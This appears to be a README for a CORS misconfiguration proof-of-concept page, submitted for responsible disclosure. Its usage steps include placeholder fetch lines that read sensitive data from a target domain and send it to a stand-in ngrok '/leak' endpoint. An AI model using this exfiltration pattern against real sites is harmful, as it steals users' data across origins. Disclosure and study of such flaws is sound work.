# 🚨 CORS Exploit PoC

This is a Proof-of-Concept (PoC) HTML page created to demonstrate a CORS (Cross-Origin Resource Sharing) misconfiguration vulnerability. It attempts to fetch sensitive data from a target domain and optionally exfiltrate the data to a controlled server.

---

## ⚠️ Disclaimer

- This PoC is for **educational** and **responsible disclosure** purposes **only**.
- Do **not** use this on any system without **explicit authorization**.
- The author does not take responsibility for any misuse of this code.

---

## 🔧 Usage Instructions

1. **Replace** the placeholder target domain:
   ```js
   fetch("https://example.com/...")

2. **Replace** the exfiltration endpoint:
     fetch("https://your-ngrok-server.ngrok-free.app/leak", ...)
     ➤ with the URL of your own ngrok or Flask server where you want to receive the leaked data.

3. Host this file on any web server (e.g., GitHub Pages) and open it in a browser to execute the PoC.
   
4. 📂 File Details
cors-exploit.html: The main PoC file. Modify this according to your target and exfiltration endpoint.


## 📩 Contact
If you are a member of the security team reviewing this report and need clarification, feel free to reach out via email.
   
